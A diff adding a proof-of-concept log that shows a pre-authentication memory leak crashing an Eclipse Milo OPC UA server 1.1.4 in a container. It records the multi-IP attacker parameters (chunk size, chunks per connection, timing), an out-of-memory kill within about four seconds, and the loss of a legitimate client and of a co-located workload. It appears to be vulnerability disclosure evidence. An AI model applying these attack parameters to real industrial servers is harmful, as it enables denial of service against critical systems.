@@ -1,0 +1,65 @@
+============================================================
+UASC pre-authentication memory-leak PoC -- Scenario B  label=vulnerable-1.1.4-multi-ip-acceleration image=memory-leak-app:1.1.4 mode=multi  2026-07-28T12:23:23Z
+============================================================
+environment: Darwin 24.6.0 / docker Docker version 28.3.3, build 980b856
+container --memory=550m --memory-swap=550m  -Xmx128m -XX:MaxDirectMemorySize=512m
+(the JVM's own direct cap is set deliberately high so it never binds; the cgroup
+ limit is the actual constraint -- this is the common containerized deployment shape)
+attacker: mode=multi sourceIPs=4 chunksPerConn=64 chunkSize=65535
+          interConnSleep=0.30s durationSec=120 (identical across vulnerable/fixed runs)
+expected outcome for this build: oomkill
+1c77103c01d8eb52a3927f4d87c7b119ba12cd20b86d52c09a4ed7df8d18c031
+
+[1/8] Start server (container-memory-bounded, no protective direct cap, heartbeat active)
+2d8b37e9a900c0214088205659300f712527df46f212bec242a58504104485c0
+    [1] legit BEFORE attack : LEGIT_CLIENT_RESULT=SUCCESS url=opc.tcp://127.0.0.1:12686/milo state=0 elapsedMs=2971
+    idle RSS            : 176.7MiB / 550MiB
+    co-located heartbeat BEFORE attack : HEARTBEAT seq=8 ts=1785241418024
+
+[2/8] Launch attacker(s): mode=multi, 4 source IP(s), identical chunk pattern
+ad981c0754dc12c0972c0a05f1e4f992836db65b870c0bdd85d57dd31cd3da07
+29fce26baf6bc764f9f695e6815f1169132661722807552944e8e16be011e654
+63755e6ca1a93c60a03c8bb7f708c65d70b257e543bf4f04b105d94372c1da93
+56b7c58a4cd7c2cda34f16deee500f6a93670de26e715c2a6e4b5eeb7b4fd327
+    4 attacker container(s) started against opc.tcp://server:12686/milo (non-loopback bridge peer,
+    so RateLimitingHandler is NOT exempted -- it is genuinely active throughout)
+
+[3/8] Watch server state for up to 120s (direct memory + container RSS + heartbeat)
+    >>> SERVER EXITED at ~t+4s: [exited oom=true exit=137]
+
+[4/8] Final server state: status=exited OOMKilled=true ExitCode=137
+
+[5/8] Stop attacker(s); collect exact accepted-connection / byte-count evidence
+    attacker[1]: acceptedConns=11 throttledConns=0 bytesSent=46136640
+    attacker[2]: acceptedConns=11 throttledConns=0 bytesSent=46136640
+    attacker[3]: acceptedConns=10 throttledConns=0 bytesSent=41942400
+    attacker[4]: acceptedConns=9 throttledConns=0 bytesSent=37748160
+    TOTAL across 4 source IP(s): acceptedConns=41 throttledConns=0 bytesSent=171963840 (164.00 MiB)
+
+[6/8] Legitimate client AFTER the attack (server is dead, or still alive if it survived)
+    [5] legit AFTER attack : LEGIT_CLIENT_RESULT=FAILURE url=opc.tcp://127.0.0.1:12686/milo error=org.eclipse.milo.opcua.stack.core.UaException: UaException: status=Bad_ConnectionRejected, message=io.netty.channel.AbstractChannel$AnnotatedConnectException: Connection refused: /127.0.0.1:12686 elapsedMs=259
+
+[7/8] Co-located unrelated workload (heartbeat thread, no Netty/OPC UA dependency)
+    last heartbeat before death : HEARTBEAT seq=12 ts=1785241422030
+    co-located workload verdict : STOPPED (process-wide -- the container is gone, so
+    this unrelated counter thread died too, even though it never touched OPC UA/Netty)
+
+[8/8] Recovery: restart server, only restart recovers
+memory-leak-svr
+    [7] legit AFTER restart : LEGIT_CLIENT_RESULT=SUCCESS url=opc.tcp://127.0.0.1:12686/milo state=0 elapsedMs=2166
+memory-leak-net
+============================================================
+MACHINE-CHECKED VERDICT[vulnerable-1.1.4-multi-ip-acceleration]: PASS (exit 0)
+============================================================
+============================================================
+SCREENSHOT SUMMARY -- vulnerable-1.1.4-multi-ip-acceleration (multi, 4 source IP)
+============================================================
+Legitimate client before attack: OK
+Attacker: 4 source IPs, 41 connections, 164.00 MiB sent
+Server direct memory: 0 -> 266.19MiB (cap 512m; container limit 550m is the binding constraint)
+Container: OOMKilled=1 ExitCode=137 after ~4s
+Legitimate client after attack: FAILED
+Co-located workload: STOPPED (process-wide)
+Legitimate client after restart: OK
+============================================================
+transcript: /Users/abhinavagarwal/Documents/work/milo-security-poc/uasc-preauth-memory-leak/poc/../evidence/scenarioB-vulnerable-1.1.4-multi-ip.log
